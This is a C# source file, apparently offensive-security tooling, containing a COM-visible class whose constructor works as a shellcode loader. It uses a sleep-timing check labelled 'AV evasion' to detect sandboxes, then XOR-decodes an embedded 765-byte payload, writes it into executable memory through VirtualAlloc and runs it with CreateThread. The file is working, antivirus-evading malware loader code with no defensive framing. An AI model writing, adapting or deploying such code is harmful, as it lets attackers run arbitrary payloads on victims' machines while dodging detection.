using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
      uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
        ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
        int dwSize, out IntPtr lpNumberOfbytesRW);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    public TestClass()
    {
        // AV evasion: Sleep for 10s and detect if time really passed
        DateTime t1 = DateTime.Now;
        Sleep(10000); // Sleep for 10 seconds
        double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
        if (deltaT < 9.5)
        {
            return; // If the sleep was shortened, likely in a sandbox, exit.
        }

        // XOR encoded payload (example)
        byte[] encoded = new byte[765] {
0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
0xb2, 0xcb, 0x28, 0xab, 0x9f, 0xb2, 0x71, 0xa8, 0x9a, 0xac, 0xb2, 0x71, 0xa8, 0xe2, 0xb2,
0x71, 0xa8, 0xda, 0xb7, 0xcb, 0x33, 0xb2, 0x71, 0x88, 0xaa, 0xb2, 0xf5, 0x4d, 0xb0, 0xb0,
0xb2, 0xcb, 0x3a, 0x56, 0xc6, 0x9b, 0x86, 0xf8, 0xd6, 0xda, 0xbb, 0x3b, 0x33, 0xf7, 0xbb,
0xfb, 0x3b, 0x18, 0x17, 0xa8, 0xb2, 0x71, 0xa8, 0xda, 0x71, 0xb8, 0xc6, 0xbb, 0xab, 0xb2,
0xfb, 0x2a, 0x9c, 0x7b, 0x82, 0xe2, 0xf1, 0xf8, 0xf5, 0x7f, 0x88, 0xfa, 0xfa, 0xfa, 0x71,
0x7a, 0x72, 0xfa, 0xfa, 0xfa, 0xb2, 0x7f, 0x3a, 0x8e, 0x9d, 0xb2, 0xfb, 0x2a, 0xaa, 0x71,
0xb2, 0xe2, 0xbe, 0x71, 0xba, 0xda, 0xb3, 0xfb, 0x2a, 0x19, 0xac, 0xb2, 0x05, 0x33, 0xb7,
0xcb, 0x33, 0xbb, 0x71, 0xce, 0x72, 0xb2, 0xfb, 0x2c, 0xb2, 0xcb, 0x3a, 0x56, 0xbb, 0x3b,
0x33, 0xf7, 0xbb, 0xfb, 0x3b, 0xc2, 0x1a, 0x8f, 0x0b, 0xb6, 0xf9, 0xb6, 0xde, 0xf2, 0xbf,
0xc3, 0x2b, 0x8f, 0x22, 0xa2, 0xbe, 0x71, 0xba, 0xde, 0xb3, 0xfb, 0x2a, 0x9c, 0xbb, 0x71,
0xf6, 0xb2, 0xbe, 0x71, 0xba, 0xe6, 0xb3, 0xfb, 0x2a, 0xbb, 0x71, 0xfe, 0x72, 0xbb, 0xa2,
0xbb, 0xa2, 0xb2, 0xfb, 0x2a, 0xa4, 0xa3, 0xa0, 0xbb, 0xa2, 0xbb, 0xa3, 0xbb, 0xa0, 0xb2,
0x79, 0x16, 0xda, 0xbb, 0xa8, 0x05, 0x1a, 0xa2, 0xbb, 0xa3, 0xa0, 0xb2, 0x71, 0xe8, 0x13,
0xb1, 0x05, 0x05, 0x05, 0xa7, 0xb2, 0xcb, 0x21, 0xa9, 0xb3, 0x44, 0x8d, 0x93, 0x94, 0x93,
0x94, 0x9f, 0x8e, 0xfa, 0xbb, 0xac, 0xb2, 0x73, 0x1b, 0xb3, 0x3d, 0x38, 0xb6, 0x8d, 0xdc,
0xfd, 0x05, 0x2f, 0xa9, 0xa9, 0xb2, 0x73, 0x1b, 0xa9, 0xa0, 0xb7, 0xcb, 0x3a, 0xb7, 0xcb,
0x33, 0xa9, 0xa9, 0xb3, 0x40, 0xc0, 0xac, 0x83, 0x5d, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f,
0x12, 0xf5, 0xfa, 0xfa, 0xfa, 0xcb, 0xc3, 0xc8, 0xd4, 0xcb, 0xcc, 0xc2, 0xd4, 0xce, 0xcf,
0xd4, 0xc8, 0xc8, 0xc2, 0xfa, 0xa0, 0xb2, 0x73, 0x3b, 0xb3, 0x3d, 0x3a, 0x41, 0xfb, 0xfa,
0xfa, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0x90, 0xf9, 0xa9, 0xb3, 0x40, 0xad, 0x73, 0x65, 0x3c,
0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0x12, 0x28, 0xfa, 0xfa, 0xfa, 0xd5, 0xc8, 0xa5, 0xa0,
0xbe, 0x99, 0x82, 0xcd, 0xca, 0xbf, 0x90, 0x82, 0xb1, 0xa9, 0x91, 0x8e, 0xb3, 0xb6, 0xaa,
0xa3, 0xbb, 0xb6, 0xbb, 0x8c, 0x8d, 0xb0, 0xc3, 0x8b, 0x92, 0xc3, 0xa5, 0xa9, 0x89, 0xcc,
0x91, 0x95, 0xc8, 0xbb, 0x8c, 0xa5, 0xb2, 0xcd, 0xc9, 0xd7, 0x8f, 0xbd, 0xb1, 0x83, 0xa9,
0x8a, 0x90, 0xb1, 0xbd, 0x9d, 0xb1, 0xcb, 0x93, 0xac, 0x90, 0xcb, 0xc3, 0x89, 0x95, 0xbb,
0xb9, 0x89, 0xa3, 0x9f, 0xa8, 0x94, 0xce, 0xbf, 0x83, 0x91, 0xbb, 0xb4, 0x93, 0x9c, 0x94,
0x9e, 0x9c, 0xac, 0xab, 0xa5, 0xb0, 0x90, 0xab, 0xad, 0x9f, 0x8b, 0xa9, 0xa2, 0xad, 0x98,
0xa9, 0x88, 0xae, 0xb2, 0x9b, 0x99, 0xb0, 0x98, 0xcf, 0xcf, 0x9c, 0xa2, 0xbf, 0xcf, 0x91,
0x9c, 0xcb, 0xc8, 0xce, 0x8e, 0x91, 0xb8, 0xb1, 0xbd, 0x9b, 0xcb, 0xb4, 0x9e, 0xb8, 0xa9,
0xbb, 0xaf, 0x8c, 0x99, 0xbd, 0x88, 0xbf, 0xca, 0xcd, 0xa3, 0x99, 0xb0, 0xaa, 0x9d, 0x80,
0x8c, 0x99, 0x8a, 0x8d, 0xb4, 0xcb, 0x8e, 0xc8, 0xc2, 0xcf, 0xbf, 0x88, 0xcf, 0xae, 0xab,
0xa3, 0xca, 0x88, 0xb3, 0xcf, 0xc9, 0x97, 0xce, 0xa8, 0x88, 0xc9, 0xb6, 0x9f, 0xc2, 0xc8,
0xc8, 0xc3, 0xaa, 0xa9, 0xc3, 0x95, 0xa0, 0x89, 0x94, 0x9b, 0xb8, 0x95, 0xaa, 0xac, 0x82,
0x9d, 0x96, 0x88, 0x93, 0x96, 0xa3, 0xaa, 0x82, 0xb7, 0xbf, 0xa2, 0xaf, 0xb7, 0xab, 0x83,
0xcb, 0xc3, 0x89, 0x8c, 0x96, 0x95, 0xc9, 0x90, 0x9e, 0xd7, 0xfa, 0xb2, 0x73, 0x3b, 0xa9,
0xa0, 0xbb, 0xa2, 0xb7, 0xcb, 0x33, 0xa9, 0xb2, 0x42, 0xfa, 0xc8, 0x52, 0x7e, 0xfa, 0xfa,
0xfa, 0xfa, 0xaa, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0x11, 0xaf, 0xd4, 0xc1, 0x05, 0x2f, 0xb2,
0x73, 0x3c, 0x90, 0xf0, 0xa5, 0xb2, 0x73, 0x0b, 0x90, 0xe5, 0xa0, 0xa8, 0x92, 0x7a, 0xc9,
0xfa, 0xfa, 0xb3, 0x73, 0x1a, 0x90, 0xfe, 0xbb, 0xa3, 0xb3, 0x40, 0x8f, 0xbc, 0x64, 0x7c,
0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb7, 0xcb, 0x3a, 0xa9, 0xa0, 0xb2, 0x73, 0x0b, 0xb7,
0xcb, 0x33, 0xb7, 0xcb, 0x33, 0xa9, 0xa9, 0xb3, 0x3d, 0x38, 0xd7, 0xfc, 0xe2, 0x81, 0x05,
0x2f, 0x7f, 0x3a, 0x8f, 0xe5, 0xb2, 0x3d, 0x3b, 0x72, 0xe9, 0xfa, 0xfa, 0xb3, 0x40, 0xbe,
0x0a, 0xcf, 0x1a, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x05, 0x35, 0x8e, 0xf8, 0x11,
0x50, 0x12, 0xaf, 0xfa, 0xfa, 0xfa, 0xa9, 0xa3, 0x90, 0xba, 0xa0, 0xb3, 0x73, 0x2b, 0x3b,
0x18, 0xea, 0xb3, 0x3d, 0x3a, 0xfa, 0xea, 0xfa, 0xfa, 0xb3, 0x40, 0xa2, 0x5e, 0xa9, 0x1f,
0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x69, 0xa9, 0xa9, 0xb2, 0x73, 0x1d, 0xb2, 0x73,
0x0b, 0xb2, 0x73, 0x20, 0xb3, 0x3d, 0x3a, 0xfa, 0xda, 0xfa, 0xfa, 0xb3, 0x73, 0x03, 0xb3,
0x40, 0xe8, 0x6c, 0x73, 0x18, 0xfa, 0xfa, 0xfa, 0xfa, 0x05, 0x2f, 0xb2, 0x79, 0x3e, 0xda,
0x7f, 0x3a, 0x8e, 0x48, 0x9c, 0x71, 0xfd, 0xb2, 0xfb, 0x39, 0x7f, 0x3a, 0x8f, 0x28, 0xa2,
0x39, 0xa2, 0x90, 0xfa, 0xa3, 0x41, 0x1a, 0xe7, 0xd0, 0xf0, 0xbb, 0x73, 0x20, 0x05, 0x2f
};

        // XOR decryption key
        byte xorKey = 0xfa;

        // Decode the XOR payload
        byte[] buf = new byte[encoded.Length];
        for (int i = 0; i < encoded.Length; i++)
        {
            buf[i] = (byte)(encoded[i] ^ xorKey);
        }

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    // Structures for CreateProcess (if needed)
    [StructLayout(LayoutKind.Sequential)]
    public struct StartupInfo
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessInfo
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessBasicInfo
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }
}